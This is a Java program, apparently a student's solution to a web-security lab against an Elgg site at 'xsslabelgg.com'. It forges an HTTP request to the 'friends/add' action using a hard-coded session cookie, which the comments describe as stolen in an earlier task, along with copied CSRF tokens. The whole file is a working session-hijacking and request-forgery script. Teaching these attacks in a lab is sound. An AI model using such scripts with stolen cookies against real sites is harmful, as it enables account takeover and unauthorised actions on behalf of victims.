import java.io.*;
import java.net.*;

public class HTTPSimpleForge {
   public static void main(String[] args) throws IOException {
      try {
         int responseCode;
         InputStream responseIn=null;
         String requestDetails="&__elgg_ts=1505979202&__elgg_token=470372e1438adbd83e34d43238562d62";

         // URL to be forged.
         URL url = new URL("http://www.xsslabelgg.com/action/friends/add?friend=39"+requestDetails);

         // URLConnection instance is created to further parameterize a
         // resource request past what the state members of URL instance
         // can represent.
         HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
         if (urlConn instanceof HttpURLConnection) {
            urlConn.setConnectTimeout(60000);
            urlConn.setReadTimeout(90000);
         }

         // addRequestProperty method is used to add HTTP Header Information.
         // Here we add User-Agent HTTP header to the forged HTTP packet.
         // Add other necessary HTTP Headers yourself. Cookies should be stolen
         // using the method in task3.
         urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
         //HTTP Post Data which includes the information to be sent to the server.

         //Added by jach: Set the cookie
         String cookies="Elgg=279rvhs8bh1lr2fr0eteofq8u3";
         urlConn.setRequestProperty("cookie",cookies);

         // String data = "name=alice&guid=39";
         // DoOutput flag of URL Connection should be set to true
         // to send HTTP POST message.
         urlConn.setDoOutput(true);
         // OutputStreamWriter is used to write the HTTP POST data
         // to the url connection.
         OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
         wr.write("");

         wr.flush();

         // HttpURLConnection a subclass of URLConnection is returned by
         // url.openConnection() since the url is an http request.
         if (urlConn instanceof HttpURLConnection) {
            HttpURLConnection httpConn = (HttpURLConnection) urlConn;
            // Contacts the web server and gets the status code from
            // HTTP Response message.
            responseCode = httpConn.getResponseCode();
            System.out.println("Response Code = " + responseCode);
            // HTTP status code HTTP_OK means the response was
            // received sucessfully.
            if (responseCode == HttpURLConnection.HTTP_OK)
               // Get the input stream from url connection object.
               responseIn = urlConn.getInputStream();
            // Create an instance for BufferedReader
            // to read the response line by line.
            BufferedReader buf_inp = new BufferedReader(
               new InputStreamReader(responseIn));

            String inputLine;
            while((inputLine = buf_inp.readLine())!=null) {
               System.out.println(inputLine);
            }
         }
      } catch (MalformedURLException e) {
         e.printStackTrace();
      }
   }
}
